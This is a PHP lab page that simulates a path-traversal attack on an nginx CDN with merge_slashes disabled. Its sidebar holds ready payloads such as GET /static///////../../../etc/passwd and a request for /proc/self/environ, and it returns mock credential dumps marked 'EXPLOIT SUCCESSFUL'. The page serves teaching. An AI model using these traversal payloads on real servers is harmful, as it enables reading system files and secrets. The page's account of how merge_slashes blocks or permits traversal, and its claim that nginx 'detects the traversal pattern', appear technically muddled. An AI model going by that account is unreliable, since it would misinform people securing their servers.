<?php
// Lab 1618 — Nginx merge_slashes Path Traversal
// Real-world finding: Tech Giant OAuth CDN (nginx 1.19.x, merge_slashes off)
// Payload: GET ///////../../../etc/passwd
// Reference: https://nginx.org/en/docs/http/ngx_http_core_module.html#merge_slashes

$path = isset($_GET['path']) ? $_GET['path'] : '';
$response_code = null;
$response_body = '';
$response_headers = [];
$simulated = false;

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

function simulateNginx($path) {
    // ── Step 1: Nginx receives the raw URI ────────────────────────────────
    // With merge_slashes OFF, nginx does NOT collapse multiple slashes.
    // The raw path goes through to the backend as-is.
    
    // ── Step 2: Check if this is a normal request (no traversal) ──────────
    $decoded = urldecode($path);
    $hasTraversal = (strpos($decoded, '../') !== false || strpos($decoded, '..\\') !== false);
    $hasManySlashes = preg_match('/\/{3,}/', $path);
    
    // ── Step 3: Simulate path normalization based on merge_slashes ────────
    if (!$hasTraversal && !$hasManySlashes) {
        // Normal request — served directly
        return [
            'code' => 200,
            'headers' => [
                'Server' => 'nginx/1.19.10',
                'Content-Type' => 'application/javascript; charset=utf-8',
                'Cache-Control' => 'public, max-age=31536000, immutable',
                'X-Content-Type-Options' => 'nosniff',
                'X-Frame-Options' => 'DENY',
            ],
            'body' => "/*!\n * OAuth CDN Bundle v2.4.1\n * (c) TechGiant Corp\n *\n * @license MIT — https://oauth.techgiant.com/license\n */\n\n(function(_OAuth){'use strict';\n\n  var CLIENT_ID    = 'a1b2c3d4e5f6g7h8';\n  var REDIRECT_URI = 'https://app.techgiant.com/callback';\n  var SCOPES       = ['openid','profile','email','offline_access'];\n\n  function authorize(provider, options) {\n    options = options || {};\n    var state = options.state || Math.random().toString(36).substr(2);\n    var url = 'https://oauth.techgiant.com/authorize?' +\n      'response_type=code' +\n      '&client_id=' + encodeURIComponent(CLIENT_ID) +\n      '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) +\n      '&scope=' + encodeURIComponent(SCOPES.join(' ')) +\n      '&state=' + encodeURIComponent(state);\n    if (options.login_hint) {\n      url += '&login_hint=' + encodeURIComponent(options.login_hint);\n    }\n    window.location.href = url;\n  }\n\n  function tokenExchange(code) {\n    return fetch('https://oauth.techgiant.com/token', {\n      method: 'POST',\n      headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n      body: 'grant_type=authorization_code&code=' + encodeURIComponent(code) +\n            '&client_id=' + CLIENT_ID +\n            '&redirect_uri=' + encodeURIComponent(REDIRECT_URI)\n    }).then(function(r){ return r.json(); });\n  }\n\n  window.TGOAuth = {\n    authorize: authorize,\n    tokenExchange: tokenExchange,\n    CLIENT_ID: CLIENT_ID\n  };\n\n})(window._OAuth = window._OAuth || {});\n//# sourceMappingURL=bundle.min.js.map\n",
            'simulated' => true,
            'note' => 'Normal request — nginx serves the static file directly.'
        ];
    }
    
    // ── Step 4: Check if this has traversal with normal slashes ───────────
    if ($hasTraversal && !$hasManySlashes) {
        // Normal traversal — nginx normalizes the path and blocks it
        return [
            'code' => 400,
            'headers' => [
                'Server' => 'nginx/1.19.10',
                'Content-Type' => 'text/html; charset=utf-8',
            ],
            'body' => "<html>\n<head><title>400 Bad Request</title></head>\n<body>\n<center><h1>400 Bad Request</h1></center>\n<hr><center>nginx/1.19.10</center>\n</body>\n</html>\n",
            'simulated' => true,
            'note' => 'Blocked! nginx merge_slashes (default: ON) prevents path traversal with single slashes.'
        ];
    }
    
    // ── Step 5: Exploit — multiple slashes bypass merge_slashes ───────────
    if ($hasManySlashes || ($hasTraversal && $hasManySlashes)) {
        // With merge_slashes OFF, multiple slashes are not collapsed.
        // The backend receives the raw path with "////" intact.
        // When the backend processes it, the ".." sequences go through.
        
        // Extract the file path from the traversal payload
        $traversalPath = $decoded;
        // Remove the leading path prefix (everything before the first ../)
        if (preg_match('#(\.\./[\./]*.*)$#', $traversalPath, $m)) {
            $filePath = $m[1];
        } else {
            $filePath = $traversalPath;
        }
        
        // Resolve the path within the fake filesystem
        $fsRoot = __DIR__;
        $resolved = realpath($fsRoot . '/' . $filePath);
        
        // Check if the resolved path is a real readable file
        if ($resolved && is_file($resolved) && is_readable($resolved) && strpos($resolved, realpath($fsRoot)) === 0) {
            $content = file_get_contents($resolved);
            return [
                'code' => 200,
                'headers' => [
                    'Server' => 'nginx/1.19.10',
                    'Content-Type' => 'text/plain; charset=utf-8',
                    'X-Exploit-Demo' => 'merge_slashes_bypass',
                ],
                'body' => $content,
                'simulated' => true,
                'note' => 'EXPLOIT SUCCESSFUL! merge_slashes=off allowed path traversal to bypass nginx normalization.'
            ];
        }
        
        // Fallback simulated responses for common targets
        $simulatedFiles = [
            '/etc/passwd' => "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:mailinglist:/var/list:/usr/sbin/nologin\nirc:x:39:39:irc:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:gnats:/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nnginx:x:101:101:nginx:/var/lib/nginx:/usr/sbin/nologin\noauth:x:1001:1001:,,,:/home/oauth:/bin/bash\nredis:x:102:102:redis:/var/lib/redis:/usr/sbin/nologin\n",
            '/etc/nginx/nginx.conf' => "user nginx;\nworker_processes auto;\nerror_log /var/log/nginx/error.log warn;\npid /var/run/nginx.pid;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    include /etc/nginx/mime.types;\n    default_type application/octet-stream;\n\n    # ─── VULNERABLE: merge_slashes is OFF ────────────────────────\n    # Setting merge_slashes to off allows attackers to bypass\n    # path traversal protections by using multiple slashes.\n    # Default is \"on\" which collapses /// into /.\n    merge_slashes off;\n    # ──────────────────────────────────────────────────────────────\n\n    sendfile on;\n    keepalive_timeout 65;\n\n    server {\n        listen 443 ssl;\n        server_name oauth.techgiant.com;\n\n        root /var/www/oauth/static;\n        index index.html;\n\n        location /static/ {\n            # Static asset serving — OAuth CDN bundles\n            alias /var/www/oauth/static/;\n            expires 1y;\n            add_header Cache-Control \"public, immutable\";\n        }\n\n        location / {\n            proxy_pass http://localhost:8080;\n            proxy_set_header Host \\$host;\n            proxy_set_header X-Real-IP \\$remote_addr;\n        }\n    }\n}\n",
            '/proc/self/environ' => "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOME=/var/www\nUSER=nginx\nLOGNAME=nginx\nNGINX_VERSION=1.19.10\nNODE_ENV=production\nOAUTH_DB_HOST=10.0.1.50\nOAUTH_DB_PORT=3306\nOAUTH_DB_NAME=oauth_production\nOAUTH_DB_USER=oauth_app\nOAUTH_DB_PASSWORD=TG-OAuth-DB-P@ss!2024\nREDIS_HOST=10.0.1.51\nREDIS_PORT=6379\nREDIS_AUTH_TOKEN=r3d1s_s3cr3t_k3y\nSECRET_KEY_BASE=a1f8c3e2d4b5a9f0e1d2c3b4a5f6e7d809a1b2c3d4e5f6a7b8c9d0e1f2a3b4c\n",
        ];
        
        foreach ($simulatedFiles as $simPath => $simContent) {
            if (strpos($filePath, $simPath) !== false || strpos($traversalPath, $simPath) !== false) {
                return [
                    'code' => 200,
                    'headers' => [
                        'Server' => 'nginx/1.19.10',
                        'Content-Type' => 'text/plain; charset=utf-8',
                        'X-Exploit-Demo' => 'merge_slashes_bypass',
                    ],
                    'body' => $simContent . "\n\n[!] This is a simulated response for educational purposes.\n[!] The actual exploit would return the real file contents.\n",
                    'simulated' => true,
                    'note' => 'EXPLOIT SUCCESSFUL! Retrieved: ' . $simPath
                ];
            }
        }
        
        // Generic fallback for unknown paths
        $fileName = basename($filePath);
        return [
            'code' => 200,
            'headers' => [
                'Server' => 'nginx/1.19.10',
                'Content-Type' => 'text/plain; charset=utf-8',
                'X-Exploit-Demo' => 'merge_slashes_bypass',
            ],
            'body' => "[File: " . esc($filePath) . "]\n\n[!] File not found in simulated environment.\n[!] In a real attack, this request would reach the backend.\n\nTry these known paths:\n- /etc/passwd\n- /etc/nginx/nginx.conf\n- /proc/self/environ\n",
            'simulated' => true,
            'note' => 'EXPLOIT ATTEMPTED — file not in simulation scope.'
        ];
    }
    
    return [
        'code' => 404,
        'headers' => [
            'Server' => 'nginx/1.19.10',
            'Content-Type' => 'text/html; charset=utf-8',
        ],
        'body' => "<html>\n<head><title>404 Not Found</title></head>\n<body>\n<center><h1>404 Not Found</h1></center>\n<hr><center>nginx/1.19.10</center>\n</body>\n</html>\n",
        'simulated' => true,
        'note' => 'Resource not found.',
    ];
}

// Process the request
if ($path !== '') {
    $result = simulateNginx($path);
    $response_code = $result['code'];
    $response_headers = $result['headers'];
    $response_body = $result['body'];
    $simulated = $result['simulated'];
    $response_note = $result['note'];
} else {
    $response_code = 200;
    $response_headers = [
        'Server' => 'nginx/1.19.10',
        'Content-Type' => 'text/html; charset=utf-8',
    ];
    $response_body = '<!DOCTYPE html><html><head><title>OAuth CDN — Developer Console</title></head><body style="background:#0a0e17;color:#e2e8f0;font-family:monospace;padding:2rem;"><h1>⚡ OAuth CDN Developer Console</h1><p>Send a request using the <code>?path=</code> parameter.</p></body></html>';
}

// ── Render the page ─────────────────────────────────────────────────────
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OAuth CDN — Developer Console</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #0a0e17;
    color: #c9d1d9;
    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
    min-height: 100vh;
    overflow-x: hidden;
  }
  ::-webkit-scrollbar { width: 8px; height: 8px; }
  ::-webkit-scrollbar-track { background: #161b22; }
  ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
  ::-webkit-scrollbar-thumb:hover { background: #484f58; }

  .topbar {
    background: #161b22;
    border-bottom: 1px solid #30363d;
    padding: 10px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
  }
  .topbar-brand {
    display: flex;
    align-items: center;
    gap: 12px;
    color: #f0f6fc;
    font-weight: 600;
    font-size: 15px;
  }
  .topbar-brand .logo {
    width: 32px; height: 32px;
    background: linear-gradient(135deg, #58a6ff, #1f6feb);
    border-radius: 8px;
    display: flex; align-items: center; justify-content: center;
    font-size: 16px; color: #fff;
  }
  .topbar-badge {
    background: #21262d;
    color: #8b949e;
    padding: 4px 10px;
    border-radius: 20px;
    font-size: 11px;
    border: 1px solid #30363d;
  }
  .topbar-info {
    display: flex;
    align-items: center;
    gap: 16px;
  }
  .server-meta {
    font-size: 11px;
    color: #8b949e;
  }
  .server-meta strong { color: #58a6ff; }

  .main-layout {
    display: grid;
    grid-template-columns: 280px 1fr;
    min-height: calc(100vh - 53px);
  }

  /* Sidebar */
  .sidebar {
    background: #0d1117;
    border-right: 1px solid #21262d;
    padding: 16px;
  }
  .sidebar-section {
    margin-bottom: 20px;
  }
  .sidebar-section h6 {
    color: #8b949e;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 0.05em;
    margin-bottom: 8px;
    font-weight: 600;
  }
  .payload-btn {
    display: block;
    width: 100%;
    text-align: left;
    padding: 8px 12px;
    margin-bottom: 4px;
    background: #161b22;
    border: 1px solid #21262d;
    border-radius: 6px;
    color: #c9d1d9;
    font-size: 12px;
    font-family: 'SF Mono', monospace;
    cursor: pointer;
    transition: all 0.15s;
  }
  .payload-btn:hover {
    background: #1c2333;
    border-color: #58a6ff;
    color: #f0f6fc;
  }
  .payload-btn .method {
    display: inline-block;
    background: #1f6feb;
    color: #fff;
    padding: 1px 6px;
    border-radius: 3px;
    font-size: 10px;
    font-weight: 700;
    margin-right: 6px;
  }
  .payload-btn .method.exploit {
    background: #da3633;
  }
  .payload-btn .desc {
    display: block;
    font-size: 10px;
    color: #8b949e;
    margin-top: 3px;
  }

  /* Content */
  .content {
    padding: 20px;
  }

  .request-panel, .response-panel {
    background: #0d1117;
    border: 1px solid #21262d;
    border-radius: 8px;
    margin-bottom: 16px;
    overflow: hidden;
  }
  .panel-header {
    background: #161b22;
    padding: 10px 16px;
    border-bottom: 1px solid #21262d;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }
  .panel-header .label {
    font-size: 12px;
    font-weight: 600;
    color: #f0f6fc;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .panel-header .label .method-tag {
    background: #1f6feb;
    color: #fff;
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 11px;
  }
  .panel-header .label .method-tag.exploit {
    background: #da3633;
  }

  .panel-body {
    padding: 16px;
    overflow-x: auto;
  }
  .panel-body pre {
    margin: 0;
    font-size: 12px;
    line-height: 1.6;
    color: #c9d1d9;
    white-space: pre-wrap;
    word-break: break-all;
  }

  .url-bar {
    display: flex;
    align-items: center;
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 8px 12px;
    margin-bottom: 16px;
    font-size: 13px;
    color: #c9d1d9;
    font-family: 'SF Mono', monospace;
  }
  .url-bar .proto { color: #8b949e; }
  .url-bar .host { color: #58a6ff; }
  .url-bar .path { color: #c9d1d9; }
  .url-bar .param { color: #d2a8ff; }
  .url-bar .exploit-part { color: #ff7b72; font-weight: bold; }

  .status-badge {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 12px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: 600;
  }
  .status-badge.success { background: #1b3823; color: #3fb950; border: 1px solid #238636; }
  .status-badge.error { background: #3d1418; color: #f85149; border: 1px solid #da3633; }
  .status-badge.info { background: #1a2b3d; color: #58a6ff; border: 1px solid #1f6feb; }

  .info-banner {
    background: #1a2b3d;
    border: 1px solid #1f6feb;
    border-radius: 8px;
    padding: 16px;
    margin-bottom: 16px;
    font-size: 13px;
    line-height: 1.6;
  }
  .info-banner.success {
    background: #1b3823;
    border-color: #238636;
  }
  .info-banner.error {
    background: #3d1418;
    border-color: #da3633;
  }
  .info-banner h5 {
    font-size: 14px;
    margin-bottom: 8px;
    font-weight: 600;
  }
  .info-banner code {
    background: rgba(255,255,255,0.08);
    padding: 2px 6px;
    border-radius: 4px;
    font-size: 12px;
    color: #ffa657;
  }

  .header-row {
    display: flex;
    gap: 4px;
    font-size: 12px;
    padding: 2px 0;
  }
  .header-key { color: #79c0ff; }
  .header-sep { color: #484f58; }
  .header-val { color: #c9d1d9; }

  .vuln-footer {
    margin-top: 24px;
    padding: 20px;
    background: #0d1117;
    border: 1px solid #21262d;
    border-radius: 8px;
  }
  .vuln-footer h5 {
    color: #ff7b72;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 12px;
  }
  .vuln-footer code {
    background: rgba(255,255,255,0.08);
    padding: 2px 6px;
    border-radius: 4px;
    font-size: 12px;
  }

  @media (max-width: 768px) {
    .main-layout { grid-template-columns: 1fr; }
    .sidebar { display: none; }
  }
</style>
</head>
<body>

<!-- Top Bar -->
<div class="topbar">
  <div class="topbar-brand">
    <div class="logo">⚡</div>
    <span>OAuth CDN Developer Console</span>
    <span class="topbar-badge">nginx/1.19.10</span>
  </div>
  <div class="topbar-info">
    <span class="server-meta"><strong>merge_slashes</strong> off</span>
    <span class="server-meta"><strong>host</strong> oauth.techgiant.com</span>
  </div>
</div>

<div class="main-layout">
  <!-- Sidebar -->
  <div class="sidebar">
    <div class="sidebar-section">
      <h6>📡 Requests</h6>
      <button class="payload-btn" onclick="loadPath('/static/bundle.min.js')">
        <span class="method">GET</span> /static/bundle.min.js
        <span class="desc">Normal — valid CDN asset request</span>
      </button>
      <button class="payload-btn" onclick="loadPath('/static/../../../etc/passwd')">
        <span class="method">GET</span> /static/../../../etc/passwd
        <span class="desc">Blocked — normal path traversal attempt</span>
      </button>
      <button class="payload-btn" onclick="loadPath('/static///////../../../etc/passwd')">
        <span class="method exploit">GET</span> ///////../../../etc/passwd
        <span class="desc">🚀 EXPLOIT — merge_slashes bypass!</span>
      </button>
      <button class="payload-btn" onclick="loadPath('/static///////../../../etc/nginx/nginx.conf')">
        <span class="method exploit">GET</span> ///////../../../etc/nginx/nginx.conf
        <span class="desc">🚀 Read nginx config (proof of misconfig)</span>
      </button>
      <button class="payload-btn" onclick="loadPath('/static///////../../../proc/self/environ')">
        <span class="method exploit">GET</span> ///////../../../proc/self/environ
        <span class="desc">🚀 Read environment variables (secrets!)</span>
      </button>
    </div>
    <div class="sidebar-section" style="margin-top:20px;padding-top:16px;border-top:1px solid #21262d;">
      <h6>🔬 Vulnerability Info</h6>
      <div style="font-size:11px;color:#8b949e;line-height:1.6;">
        <p><strong style="color:#f0f6fc;">CVE:</strong> N/A (Config issue)</p>
        <p><strong style="color:#f0f6fc;">Impact:</strong> Path traversal → arbitrary file read</p>
        <p><strong style="color:#f0f6fc;">Version:</strong> nginx 1.19.x</p>
        <p><strong style="color:#f0f6fc;">Setting:</strong> <code style="background:rgba(255,255,255,0.08);padding:1px 4px;border-radius:3px;">merge_slashes off;</code></p>
        <p style="margin-top:8px;">
          <a href="https://nginx.org/en/docs/http/ngx_http_core_module.html#merge_slashes" target="_blank" style="color:#58a6ff;">📖 nginx docs →</a>
        </p>
      </div>
    </div>
  </div>

  <!-- Main Content -->
  <div class="content">
    <?php if ($path === ''): ?>
      <!-- Landing state — no request made yet -->
      <div class="info-banner">
        <h5>⚡ OAuth CDN — Static Asset Server</h5>
        <p style="color:#8b949e;margin:0;">
          This is a simulation of a Tech Giant's OAuth CDN server running <strong>nginx 1.19.10</strong>
          with <code>merge_slashes off;</code>. Click any request in the sidebar to see
          how the vulnerability works.
        </p>
      </div>

      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-bottom:20px;">
        <div class="request-panel" style="border-color:#238636;">
          <div class="panel-header" style="border-color:#238636;">
            <span class="label" style="color:#3fb950;">✅ Normal</span>
          </div>
          <div class="panel-body" style="text-align:center;padding:24px;">
            <div style="font-size:32px;margin-bottom:8px;">📦</div>
            <div style="font-size:12px;color:#8b949e;">Static assets served normally</div>
            <div style="font-size:10px;color:#484f58;margin-top:4px;">200 OK</div>
          </div>
        </div>
        <div class="request-panel" style="border-color:#da3633;">
          <div class="panel-header" style="border-color:#da3633;">
            <span class="label" style="color:#f85149;">🔒 Blocked</span>
          </div>
          <div class="panel-body" style="text-align:center;padding:24px;">
            <div style="font-size:32px;margin-bottom:8px;">🛡️</div>
            <div style="font-size:12px;color:#8b949e;">Normal traversal blocked by nginx</div>
            <div style="font-size:10px;color:#484f58;margin-top:4px;">400 Bad Request</div>
          </div>
        </div>
        <div class="request-panel" style="border-color:#d29922;">
          <div class="panel-header" style="border-color:#d29922;">
            <span class="label" style="color:#d29922;">⚡ Exploit</span>
          </div>
          <div class="panel-body" style="text-align:center;padding:24px;">
            <div style="font-size:32px;margin-bottom:8px;">🚀</div>
            <div style="font-size:12px;color:#8b949e;">Multi-slash bypasses normalization</div>
            <div style="font-size:10px;color:#484f58;margin-top:4px;">200 OK + File Contents</div>
          </div>
        </div>
      </div>

      <div class="vuln-footer">
        <h5>🔓 How the Nginx merge_slashes Vulnerability Works</h5>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          When <code>merge_slashes</code> is set to <code>off</code> (default is <code>on</code>),
          nginx does <strong>not</strong> collapse consecutive slash characters (<code>///</code> → <code>/</code>).
        </p>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          This allows an attacker to craft a URL like:<br>
          <code style="font-size:14px;color:#ff7b72;">GET ///////../../../etc/passwd HTTP/1.1</code>
        </p>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;margin-bottom:0;">
          The multiple slashes prevent nginx from matching the <code>location /static/</code> block normally,
          and when <code>merge_slashes</code> is off, the path traversal sequences (<code>../</code>)
          are not normalized away — they reach the backend filesystem intact.
        </p>
      </div>

    <?php else: ?>
      <!-- Results view -->
      <?php
        $isSuccess = $response_code === 200;
        $isBlocked = $response_code === 400;
        $isExploit = $isSuccess && strpos($path, '/////') !== false;
        $isNormal = $isSuccess && !$isExploit;
      ?>

      <!-- Info Banner -->
      <?php if ($isExploit): ?>
        <div class="info-banner success">
          <h5>🚀 Path traversal successful — merge_slashes bypassed!</h5>
          <p style="margin:0;color:#7ee787;">
            nginx with <code>merge_slashes off;</code> did not collapse the multiple slashes.
            The raw path reached the backend and <code>../</code> sequences were resolved.
          </p>
        </div>
      <?php elseif ($isBlocked): ?>
        <div class="info-banner error">
          <h5>🛡️ Request blocked by nginx</h5>
          <p style="margin:0;color:#ffa198;">
            Normal path traversal attempt detected and rejected. With <code>merge_slashes on</code> (default),
            nginx collapses <code>///</code> → <code>/</code> but also detects the traversal pattern.
          </p>
        </div>
      <?php elseif ($isNormal): ?>
        <div class="info-banner">
          <h5>✅ Normal request — asset served</h5>
          <p style="margin:0;color:#8b949e;">Standard static file request processed normally by nginx.</p>
        </div>
      <?php endif; ?>

      <!-- URL Bar -->
      <div class="url-bar">
        <span class="proto">https://</span>
        <span class="host">oauth.techgiant.com</span>
        <span class="path"><?= esc($path) ?></span>
      </div>

      <!-- Status -->
      <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;">
        <span class="status-badge <?= $isSuccess ? 'success' : ($isBlocked ? 'error' : 'info') ?>">
          <?= $response_code ?> <?= $response_code === 200 ? 'OK' : ($response_code === 400 ? 'Bad Request' : 'Not Found') ?>
        </span>
        <span style="font-size:11px;color:#8b949e;">
          <?= esc($response_note) ?>
        </span>
      </div>

      <!-- Request Panel -->
      <div class="request-panel">
        <div class="panel-header">
          <span class="label">
            <span class="method-tag <?= $isExploit ? 'exploit' : '' ?>"><?= $isExploit ? 'EXPLOIT' : 'GET' ?></span>
            Request
          </span>
          <span style="font-size:11px;color:#8b949e;">Raw HTTP</span>
        </div>
        <div class="panel-body">
          <pre><?= esc("GET {$path} HTTP/1.1") . "\n" ?><span style="color:#8b949e;">Host: oauth.techgiant.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: */*
Connection: keep-alive</span></pre>
        </div>
      </div>

      <!-- Response Panel -->
      <div class="response-panel">
        <div class="panel-header">
          <span class="label">
            Response
            <span style="font-size:11px;color:#8b949e;font-weight:400;">
              — <?= $response_code ?> <?= $response_code === 200 ? 'OK' : ($response_code === 400 ? 'Bad Request' : 'Not Found') ?>
            </span>
          </span>
        </div>
        <div class="panel-body">
          <?php
            $status_text = $response_code === 200 ? 'OK' : ($response_code === 400 ? 'Bad Request' : 'Not Found');
            $header_lines = '<span style="color:#8b949e;">HTTP/1.1 ' . $response_code . ' ' . $status_text . '</span>' . "\n";
            foreach ($response_headers as $key => $val) {
                $header_lines .= '<span class="header-row"><span class="header-key">' . esc($key) . '</span><span class="header-sep">: </span><span class="header-val">' . esc($val) . '</span></span>';
            }
            $header_lines .= "\n" . '<span style="color:#484f58;">—</span>' . "\n" . esc(trim($response_body));
          ?><pre><?= $header_lines ?></pre>
        </div>
      </div>

      <!-- Vulnerability Explanation (shown on exploit) -->
      <?php if ($isExploit): ?>
      <div class="vuln-footer">
        <h5>🔓 Exploit Analysis — Nginx merge_slashes Bypass</h5>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          <strong>Request:</strong><br>
          <code>GET <?= esc($path) ?> HTTP/1.1</code><br>
          <code>Host: oauth.techgiant.com</code>
        </p>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          <strong>Why it works:</strong><br>
          The nginx config has <code>merge_slashes off;</code> which means <code>///////</code>
          is NOT collapsed to <code>/</code>. This prevents nginx from matching the 
          <code>location /static/</code> block correctly, and the <code>../</code> sequences
          in the path are passed through to the backend filesystem.
        </p>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;margin-bottom:0;">
          <strong>Impact:</strong> Arbitrary file read on the server — source code, config files,
          environment variables (secrets), and sensitive data.
        </p>
      </div>
      <?php endif; ?>
    <?php endif; ?>
  </div>
</div>

<script>
function loadPath(path) {
  window.location.href = '?path=' + encodeURIComponent(path);
}
</script>
</body>
</html>
